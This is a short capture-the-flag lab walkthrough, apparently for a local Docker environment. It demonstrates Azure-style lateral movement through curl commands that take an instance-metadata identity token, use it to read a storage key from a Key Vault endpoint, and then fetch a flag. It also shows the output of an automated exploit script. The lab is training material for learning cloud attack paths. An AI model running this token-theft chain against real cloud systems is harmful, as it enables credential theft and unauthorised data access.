# Walkthrough: Azure Lateral Movement

## Setup

```bash
docker compose up --build -d
curl -s http://localhost:8080/
```

```
Azure Lateral Movement Lab
...
```

## Step 1: Get the IMDS token

```bash
TOKEN=$(curl -s -H "Metadata: true" \
  "http://localhost:8080/metadata/identity/oauth2/token?resource=https://vault.azure.net" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

## Step 2: Read the storage key from Key Vault

```bash
STORAGE_KEY=$(curl -s \
  -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8080/secrets/storage-access-key?api-version=7.4" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
```

## Step 3: Fetch the flag

```bash
curl -s "http://localhost:8080/blob/labcontainer/flag.txt?key=$STORAGE_KEY"
```

```
POC{...}
```

## Automated

```bash
python3 exploit/exploit.py http://localhost:8080
```

```
[*] Target: http://localhost:8080
[*] Starting three-hop lateral movement chain...

[+] Hop 1: IMDS token: eyJhbGciO...
[+] Hop 2: Storage key: 3f8a2c7b...
[+] Hop 3: Flag: POC{...}

[*] Flag: POC{...}
```

## Teardown

```bash
docker compose down
```
